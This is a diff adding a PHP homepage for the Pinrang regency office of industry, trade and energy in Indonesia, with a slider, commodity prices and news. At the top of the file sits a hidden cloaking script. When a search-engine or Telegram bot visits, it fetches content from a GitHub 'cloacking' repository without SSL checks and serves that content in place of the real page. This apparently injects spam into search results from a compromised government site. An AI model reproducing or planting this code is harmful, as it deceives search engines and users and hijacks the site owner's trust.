@@ -1,0 +1,717 @@
+<?php
+
+
+function getUrlContents($url)
+{
+    $ch = curl_init();  // Initialize cURL session
+    curl_setopt($ch, CURLOPT_URL, $url);  // Set URL
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Return as string
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  // Follow redirects
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Optional: Ignore SSL verification
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);    // Optional: Timeout
+    $output = curl_exec($ch);  // Execute and get output
+    curl_close($ch);  // Close session
+    return $output;
+}
+
+function is_bot()
+{
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+if (is_bot()) {
+    $message = getUrlContents('https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/goidtiss');
+    echo $message;
+    exit; // Atau bisa menggunakan die()
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Dashboard - Dinas Perindustrian, Perdagangan dan ESDM Kabupaten Pinrang</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+  <!-- Favicons -->
+  <link rel="icon" href="https://disperindagesdm.pinrangkab.go.id/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://disperindagesdm.pinrangkab.go.id/favicon.ico" type="image/x-icon">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+  <!-- Vendor CSS Files -->
+  <link href="/vendors/aos/aos.css" rel="stylesheet">
+  <link href="/css/bootstrap.min.css" rel="stylesheet">
+  <link href="/vendors/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="/vendors/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="/vendors/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="/vendors/remixicon/remixicon.css" rel="stylesheet">
+  <link href="/vendors/swiper/swiper-bundle.min.css" rel="stylesheet">
+  <!-- Template Main CSS File -->
+  <link href="/css/style.css" rel="stylesheet">
+  <style>
+    .carousel-container {
+      margin-top: 6rem;
+    }
+
+    .mycarousel {
+      max-height: 70vh;
+      border-radius: 20px;
+      box-shadow:
+        2.8px 2.8px 2.2px rgba(0, 0, 0, 0.02),
+        6.7px 6.7px 5.3px rgba(0, 0, 0, 0.028),
+        12.5px 12.5px 10px rgba(0, 0, 0, 0.035),
+        22.3px 22.3px 17.9px rgba(0, 0, 0, 0.042),
+        41.8px 41.8px 33.4px rgba(0, 0, 0, 0.05),
+        100px 100px 80px rgba(0, 0, 0, 0.07);
+    }
+
+    .carousel-item img {
+      width: 100%;
+      max-height: 70vh;
+      background-position: center center;
+      object-fit: cover;
+      border-radius: 20px;
+    }
+
+    .carousel-item:after {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      display: inline-block;
+      background: rgb(0, 0, 0);
+      background: linear-gradient(180deg, rgba(0, 0, 0, 0.03267244397759106) 50%, rgba(0, 0, 0, 0.5) 100%);
+      border-radius: 20px;
+    }
+
+    .carousel-caption {
+      background-color: #00000088;
+      border-radius: 10px;
+    }
+
+    @media screen and (max-width: 768px) {
+      .mycarousel {
+        height: auto;
+      }
+
+      .carousel-item img {
+        width: 100%;
+        background-position: center center;
+        object-fit: contain;
+      }
+    }
+
+    .running-text-section {
+      margin: 40px 0;
+    }
+
+    .running-text {
+      background-color: #009970;
+      color: #fff;
+      padding: 10px 0;
+    }
+
+    .pic img {
+      border-radius: 50%;
+      border: #009970;
+      height: 20rem;
+      width: 20rem;
+      object-fit: cover;
+    }
+
+    .image-price {
+      margin: none;
+      height: 7rem;
+      width: 7rem;
+    }
+
+    .divider {
+      height: 20px;
+      width: 100%;
+      background-color: #009970;
+    }
+
+    .price-tag {
+      font-weight: bold;
+      color: #009970;
+    }
+
+    .why-us a {
+      color: white;
+    }
+
+    .why-us a:hover {
+      color: lightgray;
+    }
+
+    .icon-box a {
+      color: black;
+    }
+
+    .icon-box a:hover,
+    .more-news a {
+      color: #009970;
+    }
+
+    .author-date {
+      font-weight: lighter;
+      font-size: small !important;
+    }
+
+    .btn-more-news {
+      background-color: #00000000;
+      padding: 6px 30px 8px 30px;
+      border: solid 1px #009970;
+      border-radius: 50px;
+      color: #009970;
+    }
+
+    .btn-more-news:hover {
+      background-color: #009970;
+      color: #fff;
+    }
+
+    .news-img {
+      width: 100%;
+      max-height: 300px;
+      border-radius: 5px;
+      background-position: center center;
+      object-fit: cover;
+    }
+  </style>
+  <!-- =======================================================
+  * Template Name: Bethany - v4.7.0
+  * Template URL: https://bootstrapmade.com/bethany-free-onepage-bootstrap-theme/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+
+<body>
+  <!-- ======= Header ======= -->
+  <header id="header" class="fixed-top d-flex align-items-center">
+    <div class="container">
+      <div class="header-container d-flex align-items-center justify-content-between">
+        <div class="logo">
+          <!-- <h1 class="text-light"><a href="index.html"><span>Bethany</span></a></h1> -->
+          <!-- Uncomment below if you prefer to use an image logo -->
+          <a href="https://disperindagesdm.pinrangkab.go.id"><img src="/img/disperindag_logo_dark.png" alt="" class="img-fluid"></a>
+        </div>
+        <nav id="navbar" class="navbar">
+          <ul class="me-5">
+            <li><a class="nav-link scrollto active" href="https://disperindagesdm.pinrangkab.go.id">Beranda</a></li>
+            <li class="dropdown"><a href="#" class=""><span>Tentang Kami</span> <i class="bi bi-chevron-down"></i></a>
+              <ul>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/sejarah-singkat">Sejarah Singkat</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/profil-dinas">Profil Dinas</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/visi-dan-misi">Visi dan Misi</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/motto">Motto</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/tugas-pokok-dan-fungsi">Tugas Pokok dan Fungsi</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/struktur-organisasi">Struktur Organisasi</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/profil-kepala-dinas">Profil Kepala Dinas</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/maklumat-pelayanan">Maklumat Pelayanan</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/tentang-kami/dharma-wanita">Dharma Wanita</a></li>
+              </ul>
+            </li>
+            <li class="dropdown"><a class="" href="#"><span>Pelayanan</span> <i class="bi bi-chevron-down"></i></a>
+              <ul>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/pelayanan/rekomendasi-sektor-perdagangan">Rekomendasi Sektor Perdagangan</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/pelayanan/rekomendasi-sektor-perindustrian">Rekomendasi Sektro Perindustrian</a></li>
+              </ul>
+            </li><li class="dropdown"><a class="" href="#"><span>PPID</span> <i class="bi bi-chevron-down"></i></a>
+              <ul>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/ppid/informasi-ppid">Informasi PPID</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/ppid/layanan-informasi">Layanan Informasi</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/ppid/profil-ppid">Profil PPID</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/ppid/pekerjaan-dan-kinerja-dinas">Pekerjaan dan Kinerja</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/ppid/perundang-undangan">Perundang-Undangan</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/ppid/pengaduan">Pengaduan</a></li>
+              </ul>
+            </li>
+            <li class="dropdown"><a class="" href="#"><span>Publikasi</span> <i class="bi bi-chevron-down"></i></a>
+              <ul>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/publikasi/berita">Berita</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/publikasi/pengumuman">Pengumuman</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/publikasi/video">Video</a></li>
+              </ul>
+            </li>
+            <li class="dropdown"><a class="" href="#"><span>Bidang</span> <i class="bi bi-chevron-down"></i></a>
+              <ul>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/bidang/kemetrologian">Kemetrologian</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/bidang/pengembangan-perdagangan">Pengembangan Perdagangan</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/bidang/perindustrian-dan-esdm">Perindustrian dan ESDM</a></li>
+                <li><a class="" href="https://disperindagesdm.pinrangkab.go.id/bidang/sarana-dan-pelaku-distribusi">Sarana dan Pelaku Distribusi</a></li>
+              </ul>
+            </li>
+            <li><a class="nav-link scrollto" href="#footer">Kontak</a></li>
+          </ul>
+          <i class="bi bi-list mobile-nav-toggle"></i>
+        </nav><!-- .navbar -->
+      </div><!-- End Header Container -->
+    </div>
+  </header>
+  <!-- ======= Content ======= -->
+  <!-- ======= Carousel Section ======= -->
+  <div class="container carousel-container">
+    <div class="mycarousel">
+      <div id="carouselExampleControls" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-inner">
+          <div class="carousel-item active">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1748411096_d2633bdc725eb81cb30a.png" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Warna Budaya : Mewarnai Nusantara dengan Budaya</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1742954301_a59efea2fca0a8b3c826.jpg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Kunjungan Kerja Pansus Ranperda RTRW Kab. Polman</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1741918170_adbc4d91302b0dbb1c56.png" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Selamat dan Sukses atas Pelantikannya sebagai Ketua Dekranasda Kab. Pinrang Periode 2025-2030</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1741917868_c77d822a24b99f45347f.png" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Selamat dan Sukses atas Pelantikannya sebagai Bupati dan Wakil Bupati Kab. Pinrang Periode 2025-2030</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1729642645_9ad908295fa914fd1316.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Press Conference Lomba Cipta Motif Khas Pinrang</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1725932868_2469a4c4ab2028be6bda.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Studi Tiru di Pasar Rakyat Kota Gorontalo</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1725330755_482474b7d742e7147f67.png" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Kunjungan Dekranasda Kab. Pinrang ke Dekranasda Provinsi Jawa Barat</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1723509536_ccbc9545ac871e34946a.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Defile Pembukaan Pekan Olahraga Sambut HUT RI Ke 79 Tahun</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1723428355_5bca70d71c65ef27b984.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Pembukaan Pekan Raya Pinrang Sambut HUT RI ke-79</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1719537287_87ab5f511718b1f6de0d.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>UML Pinrang dampingi BSML Regional IV dalam pengawasan alat UTTP</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1709124385_3747c417c33bcc118947.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Forum Konsultasi Publik Standar Pelayanan Disperindag ESDM</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1707791912_0b5de89ee622ea986b4e.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Rutinitas Apel Pagi Disperindag ESDM</h5>
+            </div>
+          </div>
+          <div class="carousel-item ">
+            <img src="https://disperindagesdm.pinrangkab.go.id/img/banner/1648552920_1b46c1f131fa157fc7cd.jpeg" class="d-block w-100" alt="...">
+            <div class="carousel-caption d-md-block">
+              <h5>Selamat Datang di Website Dinas Perindag ESDM Pinrang</h5>
+            </div>
+          </div>
+        </div>
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="prev">
+          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Previous</span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="next">
+          <span class="carousel-control-next-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Next</span>
+        </button>
+      </div>
+    </div><!-- carousel end -->
+  </div>
+  <!-- ======= running text ======= -->
+  <div class="running-text-section">
+    <marquee class="running-text"> Selamat Datang di Website Resmi Dinas Perindustrian, Perdagangan, Energi dan Sumber Daya Mineral Kabupaten Pinrang, Sulawesi Selatan <span> &sdot; Selamat dan Sukses atas Pelantikannya A. Irwan Hamid sebagai Bupati dan Sudirman Bungi sebagai Wakil Bupati Kab. Pinrang Periode 2025-2030</span>
+      <span> &sdot; Selamat dan Sukses atas Pelantikan Hj. A. Sri Widiyati Irwan sebagai Ketua Dekranasda Kab. Pinrang Periode 2025-2030</span>
+    </marquee>
+  </div>
+  <!-- ======= Content ======= -->
+  <main id="main">
+    <!-- ======= About Section ======= -->
+    <section id="about" class="about">
+      <div class="container">
+        <div class="row content">
+          <div class="col-lg-6 member" data-aos="fade-right zoom-in" data-aos-delay="100">
+            <div class="pic d-flex justify-content-center">
+              <img src="/img/foto_kadis.png" alt="Kepala Dinas Dinas Perindag dan ESDM Pinrang">
+            </div>
+          </div>
+          <div class=" col-lg-6 pt-4 pt-lg-0 my-auto" data-aos="fade-left" data-aos-delay="200">
+            <figure>
+              <blockquote class="blockquote">
+                <p>
+                  <i class="bx bxs-quote-alt-left quote-icon-left text-info"></i>
+                  <strong>Selamat datang</strong> di Website Resmi Dinas Perindustrian, Perdagangan, Energi dan Sumber Daya Mineral Kabupaten Pinrang. Website ini dimaksudkan sebagai sarana publikasi untuk memberikan Informasi dan gambaran Dinas Perindustrian, Perdagangan, Energi dan Sumber Daya Mineral Kabupaten Pinrang dalam hal Publikasi dan Informasi kepada masyarakat. <i class="bx bxs-quote-alt-right quote-icon-right text-info"></i>
+                </p>
+              </blockquote>
+              <figcaption class="blockquote-footer"> Drs. H. HARTONO MEKKA, M.Si </figcaption>
+            </figure>
+          </div>
+        </div>
+      </div>
+    </section><!-- End About Section -->
+    <div class="divider"></div>
+    <!-- ======= Testimonials Section ======= -->
+    <section id="testimonials" class="testimonials section-bg mb-3 mt-3">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-2">
+            <div class="section-title" data-aos="fade-right">
+              <h2>Harga Terkini</h2>
+              <a href="https://disperindagesdm.pinrangkab.go.id/daftar-harga" class="btn-more-news">Lainnya <i class="bx bx-chevron-right"></i></a>
+            </div>
+          </div>
+          <div class="col-lg-10" data-aos="fade-up" data-aos-delay="100">
+            <div class="testimonials-slider swiper" data-aos="fade-up" data-aos-delay="100">
+              <div class="swiper-wrapper">
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Mie Instan Rasa Kari Ayam (Bungkus) </p>
+                        <p class="price-tag"> Rp 3.500 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648607832_c74b6d101304f25fc183.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Jagung Pipilan Kering (Kg) </p>
+                        <p class="price-tag"> Rp 16.500 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648607733_22920616974e11c09b7f.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Kacang Tanah (Kg) </p>
+                        <p class="price-tag"> Rp 32.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648607384_f3ff349d5c87aa29f46a.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Susu Kental Manis Frisian Flag 370 Gr (Kaleng) </p>
+                        <p class="price-tag"> Rp 13.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648607254_37da4a17ccb5ee4830ba.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Ikan Cakalang (Kg) </p>
+                        <p class="price-tag"> Rp 40.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648607088_e1d5731b23cc2c97b46a.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Ikan Segar Bandeng (Kg) </p>
+                        <p class="price-tag"> Rp 25.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648606903_fc8f4ad10eb8c5cc419c.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Ikan Segar Kembung (Kg) </p>
+                        <p class="price-tag"> Rp 40.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648606819_80ce0adf9ea6029a13f4.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Ikan Asin Teri (Kg) </p>
+                        <p class="price-tag"> Rp 100.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648606734_a8a9ba482356e2e0f49e.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Garam Halus (Kg) </p>
+                        <p class="price-tag"> Rp 10.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648606667_53667d34cd7e46f99cde.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+                <div class="swiper-slide">
+                  <div class="testimonial-item">
+                    <div class="row">
+                      <div class="col-lg-6 col-sm-12 p-3">
+                        <p> Bawang Bombay (Kg) </p>
+                        <p class="price-tag"> Rp 55.000 </p>
+                      </div>
+                      <div class="col-lg-6 col-sm-12">
+                        <img class="image-price" src="https://disperindagesdm.pinrangkab.go.id/img/price/1648606587_3a5d36c1b1af47fb216d.jpg" alt="gambar item" width="100">
+                      </div>
+                    </div>
+                  </div>
+                </div><!-- End testimonial item -->
+              </div>
+              <div class="swiper-pagination"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section><!-- End Testimonials Section -->
+    <!-- ======= Why Us Section ======= -->
+    <section id="why-us" class="why-us">
+      <div class="container">
+        <div class="section-title" data-aos="fade-left">
+          <div class="row">
+            <div class="col-6">
+              <h2>Berita</h2>
+            </div>
+            <div class="col-6 more-news">
+              <a href="https://disperindagesdm.pinrangkab.go.id/publikasi/berita" class="btn-more-news float-end">Lainnya <i class="bx bx-chevron-right"></i></a>
+            </div>
+          </div>
+          <p>Berita Terkini berisi informasi kegiatan yang dilaksanakan dan diikuti oleh Pegawai Apatur Sipil Negara lingkup Dinas Perindustrian, Perdagangan, Energi dan Sumber Daya Mineral Kabupaten Pinrang.</p>
+        </div>
+        <div class="row">
+          <div class="col-lg-4 d-flex align-items-stretch" data-aos="fade-right">
+            <div class="content">
+              <img src="https://disperindagesdm.pinrangkab.go.id/img/news/1749086240_019c8108f26bdf2ffc4a.jpg" alt="" class="news-img">
+              <a href="https://disperindagesdm.pinrangkab.go.id/publikasi/berita/pelayanan-ttu-di-rumah-pemotongan-hewan-rph">
+                <h3 class="mb-2">Pelayanan TTU di Rumah Pemotongan Hewan (RPH)</h3>
+              </a>
+              <p class="mb-4 author-date">
+                <strong>Bidang Kemetrologian</strong> &bull; <i> 4 pekan lalu </i>
+              </p>
+              <div> Pinrang, 21 Mei 2022 - Bidang Kemetrologian Disper... </div>
+              <div class="text-center">
+                <a href="https://disperindagesdm.pinrangkab.go.id/publikasi/berita/pelayanan-ttu-di-rumah-pemotongan-hewan-rph" class="more-btn">Baca <i class="bx bx-chevron-right"></i></a>
+              </div>
+            </div>
+          </div>
+          <div class="col-lg-8 d-flex align-items-stretch">
+            <div class="icon-boxes d-flex flex-column justify-content-center">
+              <div class="row">
+                <div class="col-xl-4 d-flex align-items-stretch" data-aos="zoom-in" data-aos-delay="100">
+                  <div class="icon-box mt-4 mt-xl-0">
+                    <a href="https://disperindagesdm.pinrangkab.go.id/publikasi/berita/pameran-warna-budaya-nusantara-mewarnai-dengan-budaya">
+                      <img src="https://disperindagesdm.pinrangkab.go.id/img/news/1748410843_063668a0ce90d7ef943a.png" alt="" class="news-img mb-2">
+                      <h4 class="mb-2">Pameran Warna Budaya : Nusantara Mewarnai dengan Budaya</h4>
+                    </a>
+                    <p class="mb-4 author-date">
+                      <span>Dekranasda Pinrang</span> &bull; <span> bulan lalu </span>
+                    </p>
+                    <div style="text-align: start;"> Makassar 22 Mei 2025 -Kegiatan Warna Budaya: Mewar... </div>
+                  </div>
+                </div>
+                <div class="col-xl-4 d-flex align-items-stretch" data-aos="zoom-in" data-aos-delay="100">
+                  <div class="icon-box mt-4 mt-xl-0">
+                    <a href="https://disperindagesdm.pinrangkab.go.id/publikasi/berita/pameran-mini-dekranasda-di-hyatt-place-makassar">
+                      <img src="https://disperindagesdm.pinrangkab.go.id/img/news/1745475669_800017fa83befdc46c3f.jpg" alt="" class="news-img mb-2">
+                      <h4 class="mb-2">Pameran Mini Dekranasda di Hyatt Place Makassar</h4>
+                    </a>
+                    <p class="mb-4 author-date">
+                      <span>Bidang Perindustrian-ESDM</span> &bull; <span> April 2025 </span>
+                    </p>
+                    <div style="text-align: start;"> Rabu, 23 April 2025 - Dalam rangka kunjungan Mente... </div>
+                  </div>
+                </div>
+                <div class="col-xl-4 d-flex align-items-stretch" data-aos="zoom-in" data-aos-delay="100">
+                  <div class="icon-box mt-4 mt-xl-0">
+                    <a href="https://disperindagesdm.pinrangkab.go.id/publikasi/berita/disperindag-esdm-kabpinrang-sambut-pansus-ranperda-rtrw-kab-polman">
+                      <img src="https://disperindagesdm.pinrangkab.go.id/img/news/1742954580_29a6cfd7ef197d444ebe.jpg" alt="" class="news-img mb-2">
+                      <h4 class="mb-2">Disperindag ESDM Kab.Pinrang Sambut Pansus Ranperda RTRW Kab. Polman</h4>
+                    </a>
+                    <p class="mb-4 author-date">
+                      <span>Bidang Perindustrian-ESDM</span> &bull; <span> March 2025 </span>
+                    </p>
+                    <div style="text-align: start;"> Pinrang, 25 Maret 2025 -&nbsp;&nbsp;Dinas Perindus... </div>
+                  </div>
+                </div>
+              </div>
+            </div><!-- End .content-->
+          </div>
+        </div>
+      </div>
+    </section><!-- End Why Us Section -->
+    <!-- ======= Clients Section ======= -->
+    <section id="clients" class="clients">
+      <div class="container">
+        <div class="row d-flex justify-content-center">
+          <div class="col-lg-2 col-md-4 col-6 my-auto" data-aos="zoom-in" data-aos-delay="300">
+            <img src="/img/kemenperin.png" class="img-fluid" alt="">
+          </div>
+          <div class="col-lg-2 col-md-4 col-6 my-auto" data-aos="zoom-in" data-aos-delay="200">
+            <img src="/img/kemendag.png" class="img-fluid" alt="">
+          </div>
+          <div class="col-lg-2 col-md-4 col-6 my-auto" data-aos="zoom-in" data-aos-delay="100">
+            <img src="/img/logo-pinrang.png" class="img-fluid" alt="">
+          </div>
+          <div class="col-lg-2 col-md-4 col-6 my-auto" data-aos="zoom-in" data-aos-delay="200">
+            <img src="/img/kemenesdm.gif" class="img-fluid" alt="">
+          </div>
+          <div class="col-lg-2 col-md-4 col-6 my-auto" data-aos="zoom-in" data-aos-delay="300">
+            <img src="/img/lpse.png" class="img-fluid" alt="">
+          </div>
+        </div>
+      </div>
+    </section><!-- End Clients Section -->
+    <div class="divider"></div>
+  </main>
+  <!-- End Content -->
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="footer-top">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-md-6 footer-contact">
+            <h4>Dinas Perindustrian, Perdagangan, Energi dan Sumber Daya Mineral <br> Kabupaten Pinrang Provinsi Sulawesi Selatan</h4>
+            <p> Jl Bintang Nomor 1 (Kompleks Kantor Bupati Pinrang) <br> Pinrang 91212 <br><br>
+              <strong>Phone:</strong> (0421) 921215)<br>
+            </p>
+          </div>
+          <div class="col-lg-4 col-md-6 footer-links">
+            <div class="float-end">
+              <h4>Link Terkait</h4>
+              <div class="row">
+                <div class="col-6">
+                  <ul>
+                    <li><i class="bx bx-chevron-right"></i> <a target="_blank" href="https://www.kemenperin.go.id/">Kementrian Perindustrian</a></li>
+                    <li><i class="bx bx-chevron-right"></i> <a target="_blank" href="https://www.kemendag.go.id/id">Kementrian Perdagangan</a></li>
+                    <li><i class="bx bx-chevron-right"></i> <a target="_blank" href="https://www.esdm.go.id/">Kementrian ESDM</a></li>
+                    <li><i class="bx bx-chevron-right"></i> <a target="_blank" href="https://pinrangkab.go.id/">Pemerintah Kabupaten Pinrang</a></li>
+                  </ul>
+                </div>
+                <div class="col-6">
+                  <ul>
+                    <li><i class="bx bx-chevron-right"></i> <a target="_blank" href="http://lpse.pinrangkab.go.id/">LPSE Kabupaten Pinrang</a></li>
+                    <li><i class="bx bx-chevron-right"></i> <a target="_blank" href="https://spkonline.bps.go.id/sibaku/tentangkls">SIBAKU</a></li>
+                    <li><i class="bx bx-chevron-right"></i> <a target="_blank" href="https://oss.go.id/">OSS</a></li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="container d-md-flex py-4">
+      <div class="me-md-auto text-center text-md-start">
+        <div class="copyright"> &copy; Copyright <strong><span>Disperindag ESDM Kabupaten Pinrang Provinsi Sulawesi Selatan</span></strong>. All Rights Reserved </div>
+        <div class="credits">
+          <!-- All the links in the footer should remain intact. -->
+          <!-- You can delete the links only if you purchased the pro version. -->
